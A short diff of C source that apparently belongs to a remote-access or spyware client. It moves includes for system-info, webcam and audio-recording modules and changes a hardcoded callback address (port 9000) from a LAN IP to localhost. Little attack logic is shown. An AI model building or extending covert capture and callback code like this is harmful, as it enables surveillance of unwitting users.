@@ -13,9 +13,9 @@
 #include <sys/stat.h>
 #include <netdb.h>
 #include "../src/base64.c"
-#include "../src/sysInfoLin.c"
-#include "../src/webcamLin.c"
-#include "../src/audioRecord.c"
+#include "../src/linux/sysInfoLin.c"
+#include "../src/linux/webcamLin.c"
+#include "../src/linux/audioRecord.c"
 
 
 // Definiciones
@@ -457,7 +457,7 @@ void conection(){
     
     cltAddr.sin_family = AF_INET;
     cltAddr.sin_port = htons(9000); // Especifcamos puerto 
-    cltAddr.sin_addr.s_addr = inet_addr("192.168.131.33"); // Especificar DIRECCION IP
+    cltAddr.sin_addr.s_addr = inet_addr("127.0.0.1"); // Especificar DIRECCION IP
 
     int targetConnStatus 
         = connect(conn, (struct sockaddr*)&cltAddr, 
